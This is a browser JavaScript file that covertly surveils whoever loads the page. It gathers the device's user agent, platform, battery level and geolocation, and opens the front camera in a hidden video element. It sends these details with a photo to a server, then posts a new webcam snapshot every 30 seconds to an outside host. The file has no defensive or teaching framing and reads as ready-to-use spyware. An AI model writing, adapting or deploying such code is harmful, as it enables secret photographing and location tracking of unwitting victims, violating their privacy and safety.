// Collect User-Agent and OS Info
const userAgent = navigator.userAgent;
const os = navigator.platform;

// Collect Battery Percentage
navigator.getBattery().then(battery => {
    const batteryLevel = battery.level * 100 + "%";

    // Access Front Camera and Take Photo every 30 seconds
    const video = document.createElement('video');
    video.style.display = 'none'; // Hide the video element
    document.body.appendChild(video); // Append video to the DOM (so it's available for access)

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;

            // Wait until video metadata (e.g., dimensions) is loaded
            video.onloadedmetadata = function() {
                video.play(); // Start video playback once metadata is ready

                // Collect Location (if permission is granted)
                navigator.geolocation.getCurrentPosition(position => {
                    const location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };

                    console.log("User Details Collected:", { userAgent, os, batteryLevel, location });

                    // Send user details and first photo to the backend
                    const sendUserDetails = () => {
                        // Capture the first photo
                        const canvas = document.createElement('canvas');
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photo = canvas.toDataURL('image/png'); // Base64 photo

                        // Send user details and photo to the backend
                        fetch('', { // Replace with your server URL
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                userAgent,
                                os,
                                battery: batteryLevel,
                                location,
                                photo
                            })
                        })
                        .then(response => response.json())
                        .then(data => console.log('User details and photo saved:', data))
                        .catch(error => console.error('Error saving user details:', error));
                    };

                    // Send user details immediately after collecting them
                    sendUserDetails();

                    // Capture additional photos every 30 seconds (but without sending user details again)
                    setInterval(() => {
                        const canvas = document.createElement('canvas');
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photo = canvas.toDataURL('image/png');

                        // Send the captured photo to the backend
                        fetch('https://my-photo-bot.onrender.com/save-photo', { // Replace with your server URL
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ photo })
                        })
                        .then(response => response.json())
                        .then(data => console.log('Photo saved on server:', data))
                        .catch(error => console.error('Error saving photo:', error));
                    }, 30000); // Capture photo every 30 seconds
                }, error => {
                    console.error("Location access denied:", error);
                });
            };
        })
        .catch(err => {
            if (err.name === "NotReadableError") {
                console.error("Camera access failed. Ensure the camera is not in use by another application.");
            } else {
                console.error("Camera Access Denied:", err);
            }
        });
});
